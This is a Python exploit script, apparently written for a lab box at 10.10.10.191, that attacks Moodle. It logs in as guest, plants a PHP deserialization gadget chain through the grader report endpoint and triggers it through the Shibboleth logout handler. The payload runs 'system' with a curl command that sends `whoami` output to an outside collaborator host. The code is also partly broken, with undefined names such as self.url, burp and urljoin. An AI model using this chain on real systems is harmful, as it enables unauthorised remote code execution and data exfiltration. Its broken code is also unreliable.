from itertools import product
from pwn import *
import string, pdb, signal, sys, time, requests, urllib3, re

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


login_url = "http://10.10.10.191/login/index.php"
flag = self.url.replace("http://","").replace("https://","").replace(":","").replace("/","").replace("-","")
if len(flag) > 20:
            flag = flag[:20]
else:
    length = 20 - len(flag)
    flag += length*'a'
def trypreauth():
    s = requests.session()
    html=s.get(login_url).text
    logintoken = re.findall('<input type="hidden" name="logintoken" value="(.*?)">', html)[0]
    guest = {
                "logintoken": logintoken,
                "username": "guest",
                "password": "guest"
            }
    p1 = log.progress("Login as :")
    p1.status("guest")
    

    s.post(login_url, data=guest)
    
    data2 = {
                "id": 1,
                "sifirst": 'Testaaaaa|a:2:{i:0;O:22:"core_question_external":0:{}i:1;O:14:"core\lock\lock":1:{s:3:"key";O:22:"core_availability\\tree":1:{s:8:"children";O:23:"core\dml\\recordset_walk":3:{s:9:"recordset";O:25:"question_attempt_iterator":2:{s:5:"slots";a:1:{s:3:"xxx";s:3:"key";}s:4:"quba";O:26:"question_usage_by_activity":1:{s:16:"questionattempts";a:1:{s:3:"key";s:56:"curl http://aaaaaaaaaaaaaaaaaaaa.'.replace("aaaaaaaaaaaaaaaaaaaa",flag) + burp + '/`whoami`";}}}s:13:"callbackextra";N;s:8:"callback";s:6:"system";}}}}Testbbbbbb|'
            }
    data3 = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>
            <LogoutNotification><SessionID>ssss</SessionID>
            </LogoutNotification></s:Body></s:Envelope>'''
    write_url= urljoin(self.url, '/grade/report/grader/index.php')
    s.post(write_url, data=data2)
    rce_url = urljoin(self.url, "/auth/shibboleth/logout.php")
    requests.post(rce_url, data=data3)
if __name__ == '__main__':

    trypreauth()
